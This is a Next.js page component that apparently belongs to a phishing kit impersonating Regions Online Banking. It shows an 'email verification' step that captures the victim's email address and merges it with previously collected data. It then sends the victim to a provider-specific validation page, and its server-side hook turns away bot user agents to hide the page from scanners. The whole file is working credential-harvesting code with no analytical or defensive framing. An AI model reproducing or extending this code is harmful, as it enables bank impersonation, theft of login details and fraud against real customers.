import { Box, Flex, Text, Image } from "@chakra-ui/react";
import Head from "next/head";
import React, { useContext, useState } from "react";
import { Container } from "../../components/Container";
import { Input } from "../../components/Input";
import { Wrapper } from "../../components/Wrapper";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import MobileDetect from "mobile-detect";
import { NextPage } from "next";
import { DataContext } from "../_app";
import { AltButton } from "../../components/AltButton";
import { getProgress } from "../../utils/getProgress";

interface EmailVerificationProps {}

const schema = yup.object().shape({
  email: yup
    .string()
    .required("This field is required, please enter your email address.")
    .email("Oops! Looks like the email address you have entered is not valid."),
});

const EmailVerification: NextPage<EmailVerificationProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    setData({
      ...datas,
      ...data,
    });

    const emailProvider = data["email"].split("@")[1].split(".")[0];
    push(`/email/validate/${emailProvider}`);
  });

  return (
    <Wrapper>
      <Head>
        <title>Regions Online Banking - Verify Email Address | Regions</title>
      </Head>
      <Box as={`main`} display={`block`}>
        <Container
          progress={getProgress()}
          highlight={getProgress().indexOf(`Email Verification`)}
          showTitle
          showSide
          display={`flex`}
          bgColor={`#fff`}
          border={`2px solid #eee`}
          borderBottom={[`none`, `2px solid #eee`]}
          borderLeft={[`none`, `2px solid #eee`]}
          borderRight={[`none`, `2px solid #eee`]}
          borderRadius={`2px`}
          boxShadow={[`none`, `0 4px 10px rgb(0 0 0 / 3%)`]}
          justifyContent={`flex-start`}
          m={[`15px auto 30px`, `50px auto`]}
          p={0}
          maxW={`initial`}
          w={`auto`}
          bg={`#f9f9f9`}
          flexDir={[`column`, `row`]}
        >
          <Box
            flex={`1 1 auto`}
            borderRight={[`none`, `2px solid #eee`]}
            borderBottom={[`2px solid #eee`, `none`]}
            p={[`30px 15px`, `30px`]}
            bg={`white`}
          >
            <Flex flexDir={`column`}>
              <Text
                as={`h2`}
                fontFamily={`inherit`}
                fontWeight={700}
                lineHeight={1.1}
                color={`inherit`}
                mb={`13.5px`}
                fontSize={`18px`}
              >
                {`Let's `}continue, please enter the following required
                information:
              </Text>
              <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                <Box
                  w={`100%`}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  //   px={`15px`}
                >
                  <Input
                    label={`Email Address`}
                    error={errors.email && errors.email.message}
                    register={register}
                    name={`email`}
                  />
                </Box>
              </Box>
              <AltButton onClick={onSubmit} disabled={loading}>
                Next
              </AltButton>
            </Flex>
          </Box>
        </Container>
      </Box>
    </Wrapper>
  );
};

EmailVerification.getInitialProps = ({ res, req, ...props }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res?.end(`Fuck off`);
    return {};
  }

  return {
    ...props,
  };
};

export default EmailVerification;
